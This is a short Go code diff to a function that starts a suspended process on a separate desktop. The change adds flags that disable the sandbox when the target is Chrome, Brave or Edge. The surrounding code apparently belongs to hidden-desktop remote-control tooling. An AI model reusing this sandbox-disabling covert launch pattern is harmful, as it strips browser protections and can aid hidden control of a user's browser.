@@ -433,7 +433,16 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath string) (
 	if err != nil {
 		return 0, 0, 0, fmt.Errorf("failed to convert desktop name: %v", err)
 	}
-	cmdLine, err := syscall.UTF16FromString(filePath + " --window-position=0,0")
+	args := " --window-position=0,0"
+	browserExes := map[string]bool{
+		"chrome.exe":  true,
+		"brave.exe":   true,
+		"msedge.exe":  true,
+	}
+	if browserExes[strings.ToLower(filepath.Base(filePath))] {
+		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu"
+	}
+	cmdLine, err := syscall.UTF16FromString(filePath + args)
 	if err != nil {
 		return 0, 0, 0, fmt.Errorf("failed to convert command line: %v", err)
 	}
